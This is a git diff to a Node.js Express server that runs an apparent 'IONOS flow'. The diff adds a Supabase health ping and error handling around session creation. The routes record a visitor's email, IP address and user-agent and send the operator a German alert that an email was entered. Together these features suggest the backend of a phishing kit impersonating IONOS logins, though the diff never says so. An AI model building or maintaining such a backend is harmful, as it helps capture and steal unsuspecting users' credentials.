@@ -3,7 +3,7 @@ const express = require("express");
 const os = require("os");
 const path = require("path");
 const flow = require("./lib/ionos-flow");
-const { getStoreMode } = require("./lib/ionos-store");
+const { getStoreMode, pingSupabase } = require("./lib/ionos-store");
 
 const app = express();
 const PORT = process.env.PORT || 3000;
@@ -368,15 +368,17 @@ app.get("/ionos-flow.js", (_req, res) => {
   res.sendFile(path.join(__dirname, "public", "ionos-flow.js"));
 });
 
-app.get("/health", (_req, res) =>
+app.get("/health", async (_req, res) => {
+  const supabasePing = await pingSupabase();
   res.json({
     ok: true,
-    version: 3,
+    version: 4,
     sessionStore: getStoreMode(),
     supabase: Boolean(process.env.SUPABASE_URL && process.env.SUPABASE_SERVICE_ROLE_KEY),
+    supabasePing,
     commit: process.env.VERCEL_GIT_COMMIT_SHA || "local",
-  })
-);
+  });
+});
 
 // ── IONOS flow control ──────────────────────────────────────────────
 
@@ -386,15 +388,20 @@ app.post("/api/ionos/start", async (req, res) => {
     return res.status(400).json({ ok: false, message: "Email required" });
   }
 
-  const session = await flow.createSession({
-    email,
-    ip: getClientIp(req),
-    ua: req.headers["user-agent"] || "",
-  });
+  try {
+    const session = await flow.createSession({
+      email,
+      ip: getClientIp(req),
+      ua: req.headers["user-agent"] || "",
+    });
 
-  notifyFlowSessionAsync(session, "📧 IONOS — Email eingegeben");
+    notifyFlowSessionAsync(session, "📧 IONOS — Email eingegeben");
 
-  return res.json({ ok: true, sessionId: session.id, store: getStoreMode() });
+    return res.json({ ok: true, sessionId: session.id, store: getStoreMode() });
+  } catch (err) {
+    console.error("[ionos/start]", err.message);
+    return res.status(503).json({ ok: false, message: "Session store unavailable" });
+  }
 });
 
 app.get("/api/ionos/session/:id", async (req, res) => {
